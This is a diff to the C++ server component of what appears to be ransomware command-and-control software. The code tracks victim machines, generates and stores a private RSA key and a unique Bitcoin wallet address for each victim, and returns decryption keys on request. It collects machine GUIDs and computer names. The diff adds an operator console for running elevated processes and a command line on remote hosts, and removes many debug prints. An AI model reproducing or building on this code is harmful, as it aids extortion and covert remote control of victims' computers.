@@ -94,8 +94,6 @@ void ServerInterface::ListenForUDPMessages() {
 	sockaddr_in recvAddr;
 	int addrSize = sizeof(recvAddr);
 
-	std::cout << "Listening for udp messages\n";
-
 	// receive while udp server is alive
 	while ( this->m_UDPServerDetails.alive == TRUE ) {
 		ClientRequest req = {};
@@ -104,10 +102,8 @@ void ServerInterface::ListenForUDPMessages() {
 		if ( !received )
 			continue;
 
-		std::cout << "Received a message on the UDP socket." << std::endl;
 		PerformRequest(req, this->m_UDPServerDetails, -1, incomingAddr);
 	}
-	std::cout << "Not receiving\n";
 }
 
 /**
@@ -135,17 +131,14 @@ BOOL ServerInterface::TCPSendMessageToAllClients(ServerCommand& req) {
  * \return File contents as a JSON type
  */
 JSON ServerInterface::ReadServerStateFile() {
-	std::cout << "reading server state file..\n";
 	JSON parsed;
 	if ( std::filesystem::file_size(ReadConfig().serverStateFullPath) == 0 ) {
-		std::cout << "empty\n";
 		return parsed;
 	}
 	
 	std::ifstream input(ReadConfig().serverStateFullPath);
 
 	input >> parsed;  // Attempt to parse the JSON
-	std::cout << "done\n";
 	return parsed;
 }
 
@@ -163,8 +156,6 @@ Client* ServerInterface::GetClientSaveFile(long cuid) {
 
 	if ( !IsClientInSaveFile(machineGUID) )
 		return {};
-
-	std::cout << "Importing client from save file\n";
 
 	JSON data = ReadServerStateFile();
 	if ( !data.contains("client_list") )
@@ -184,8 +175,6 @@ Client* ServerInterface::GetClientSaveFile(long cuid) {
 	client->SetEncryptionKeys(secrets);
 	client->UniqueBTCWalletAddress = JSONClientInfo["unique_btc_wallet"];
 
-	std::cout << "Imported Client from save file (" << client->GetMachineGUID() << "/" << client->GetDesktopName() << ")\n";
-
 	return client;
 }
 
@@ -196,8 +185,6 @@ Client* ServerInterface::GetClientSaveFile(long cuid) {
  */
 BOOL ServerInterface::SaveServerState() {
 	m_ClientListMutex.lock();
-
-	std::cout << "Saving server state\n";
 
 	JSON data = ReadServerStateFile();
 	data["server_info"] = {
@@ -222,8 +209,6 @@ BOOL ServerInterface::SaveServerState() {
 			{ "b64_rsa_private_key", macaron::Base64::Encode(client.GetSecrets().strPrivateKey) },
 		};
 	}
-
-	std::cout << data.dump(4) << std::endl;
 
 	std::ofstream outFile(ReadConfig().serverStateFullPath);
 	outFile << std::setw(4) << data << std::endl;
@@ -261,9 +246,6 @@ BOOL ServerInterface::PerformRequest(ClientRequest req, Server on, long cuid, so
 
 	if ( onTCP ) 
 		TCPClient = GetClientPtr(cuid);
-
-	std::cout << "Received a request.\n - Performing Action : " << req.action << std::endl;
-	if ( TCPClient ) std::cout << " - From: " << TCPClient->GetDesktopName() << std::endl;
 
 	switch ( req.action )
 	{
@@ -310,7 +292,6 @@ BOOL ServerInterface::PerformRequest(ClientRequest req, Server on, long cuid, so
 		//	success = FALSE;
 		//	break;
 		//}
-		std::cout << "Client wants this decryption key " << TCPClient->GetSecrets().strPrivateKey << std::endl;
 
 		ServerCommand reply(RemoteAction::kReturnPrivateRSAKey, {}, "", "", TCPClient->GetSecrets().strPrivateKey);
 		success = TCPSendMessageToClient(cuid, reply);
@@ -344,8 +325,6 @@ void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
 	if ( client == nullptr )
 		return;
 
-	std::cout << "New thread created to receive messages from client " << client->GetDesktopName() << std::endl;
-
 	// initial request to send rsa keys before we can start encrypted communication
 	// use tcp server because udp is prone to not sending the keys fully
 	{
@@ -370,7 +349,6 @@ void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
 
 		// get a client response usually after an action is performed on the remote host
 		if ( client->ExpectingResponse ) {
-			std::cout << "expecting response\n";
 			client->LastClientResponse = client->RecentClientResponse;
 			client->RecentClientResponse = ReceiveDataFrom<ClientResponse>(client->GetSocket(TCP), TRUE, client->GetSecrets().bioPrivateKey);
 			continue;
@@ -379,12 +357,8 @@ void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
 		// receive data from client, decrypt it using their rsa key
 		ClientMessage receivedData = ReceiveDataFrom<ClientMessage>(client->GetSocket(TCP), TRUE, client->GetSecrets().bioPrivateKey);
 
-		std::cout << "Client name: " << client->GetMachineGUID() << std::endl;
-		std::cout << "Most recent request: " << receivedData.action << std::endl;
-
 		BOOL performed = PerformRequest(receivedData, this->m_TCPServerDetails, cuid);
 	} while ( client->Alive );
-	std::cout << "Stopped receiving from a client\n";
 }
 
 /**
@@ -405,7 +379,6 @@ BOOL ServerInterface::SendTCPClientRSAPublicKey(long cuid, BIO* pubKey) {
 	BYTESTRING buffer = Serialization::SerializeString(base64);
 
 	BOOL sent = NetCommon::TransmitData(buffer, client->GetSocket(TCP), TCP);
-	std::cout << "Sent RSA Pub Key " << bio << std::endl;
 
 	return TRUE;
 }
@@ -430,25 +403,54 @@ void ServerInterface::AcceptTCPConnections() {
 		if ( clientSocket == INVALID_SOCKET )
 			continue;
 
-		std::cout << "Accepted a client on the tcp server." << std::endl;
-
 		Client  newClient(clientSocket, 0, addr);
 		RSAKeys keys = GenerateRSAPair();
 		newClient.SetEncryptionKeys(keys);
 		
 		AddToClientList(newClient); // add them to the client list
-				
-		std::cout << "Good connection. Send TCP Client key\n";
 
 		// start receiving tcp data from that client for the lifetime of that client
 		std::thread receive(&ServerInterface::TCPReceiveMessagesFromClient, this, newClient.ClientUID);
 		receive.detach();
-
-		// TODO: make it so we can send information to the client
 	}
 
 	// stopped accepting connections. this function is now done.
 	this->m_TCPServerDetails.accepting = FALSE;
+}
+
+
+void ServerInterface::RunUserInputOnClients() {
+	while ( this->m_TCPServerDetails.alive ) {
+		// select which client to run command on
+		unsigned long clientID  = 0;	
+		unsigned int  command   = -1;
+		BOOL		  performed = FALSE;
+
+		std::cout << "YOU ARE NOW RUNNING COMMANDS ON REMOTE HOSTS...\n";
+		std::cout << "Enter 'ClientID' of the remote host to perform commands on (0 for all): ";
+		std::cin >> clientID;
+		std::cout << "\nPerforming commands on client " << clientID << std::endl;
+
+		// input number corrosponding to remote host command
+		do {
+			std::cout << "Input number corresponding to remote host command: ";
+			std::cin >> command;
+			switch ( command ) {
+			case RemoteAction::KOpenElevatedProcess:
+			case RemoteAction::kOpenRemoteProcess:
+			case RemoteAction::kPingClient:
+			case RemoteAction::kReturnPrivateRSAKey:
+			case RemoteAction::kReturnPublicRSAKey:
+			case RemoteAction::kSendPublicRSAKey:
+			case RemoteAction::kUseCommandLineInterface:
+				performed = TRUE;
+				break;
+			}
+
+		} while ( performed );
+
+		system("cls");
+	}
 }
 
 /**
@@ -468,7 +470,6 @@ BOOL ServerInterface::GetClientMachineGUID(long cuid) {
 	BYTESTRING decrypted = LGCrypto::RSADecrypt(machienGUID, client->GetSecrets().bioPrivateKey, TRUE);
 	std::string machineGuid = Serialization::BytestringToString(decrypted);
 	client->SetMachineGUID(machineGuid);
-	std::cout << "Got machine GUID: " << client->GetMachineGUID() << std::endl;
 	return TRUE;
 }
 
@@ -489,8 +490,6 @@ BOOL ServerInterface::GetClientComputerName(long cuid) {
 	BYTESTRING decrypted = LGCrypto::RSADecrypt(computerNameSerialized, client->GetSecrets().bioPrivateKey, TRUE);
 	std::string computerName = Serialization::BytestringToString(decrypted);
 	client->SetDesktopName(computerName);
-	std::cout << "Got client computer naem: " << client->GetDesktopName() << std::endl;
-
 	return TRUE;
 }
 
@@ -502,9 +501,7 @@ BOOL ServerInterface::GetClientComputerName(long cuid) {
  * \param port - the port the server shall run on
  * \return 'Server' structure with all fields filled out and a valid socket based on the server type.
  */
-Server ServerInterface::NewServerInstance(SocketTypes serverType, int port) {
-	std::cout << "Creating server" << std::endl;
-	
+Server ServerInterface::NewServerInstance(SocketTypes serverType, int port) {	
 	Server server = {};
 	
 	if ( !NetCommon::WSAInitialized )
@@ -533,8 +530,6 @@ Server ServerInterface::NewServerInstance(SocketTypes serverType, int port) {
 	server.port                 = port;
 	server.alive = TRUE;
 
-	std::cout << "Created server on port: " << port << std::endl;
-
 	return server;
 }
 
@@ -546,6 +541,7 @@ Server ServerInterface::NewServerInstance(SocketTypes serverType, int port) {
  * \return TRUE if the server has started, FALSE if otherwise
  */
 BOOL ServerInterface::StartServer(Server& server) {
+	std::cout << "Starting server on port " << server.port << "... ";
 	if ( server.sfd == INVALID_SOCKET )
 		return FALSE;
 
@@ -556,8 +552,6 @@ BOOL ServerInterface::StartServer(Server& server) {
 		return FALSE;
 
 	server.alive = TRUE;
-
-	std::cout << "starting server\n";
 
 	// listen if TCP server
 	if ( server.type == SOCK_STREAM ) {
@@ -578,6 +572,8 @@ BOOL ServerInterface::StartServer(Server& server) {
 		std::thread receiveThread(&ServerInterface::ListenForUDPMessages, this);
 		receiveThread.detach();
 	}
+
+	std::cout << "Done!" << std::endl;
 
 	return TRUE;
 }
@@ -725,9 +721,7 @@ BOOL ServerInterface::ClientIsInClientList(long cuid) {
  * \param client - the client to add
  * \return TRUE if the client was added.
  */
-BOOL ServerInterface::AddToClientList(Client client) {
-	std::cout << "Adding client to list\n";
-	
+BOOL ServerInterface::AddToClientList(Client client) {	
 	m_ClientListMutex.lock();	
 	this->m_ClientList.insert(std::make_pair(client.ClientUID, client));
 	 
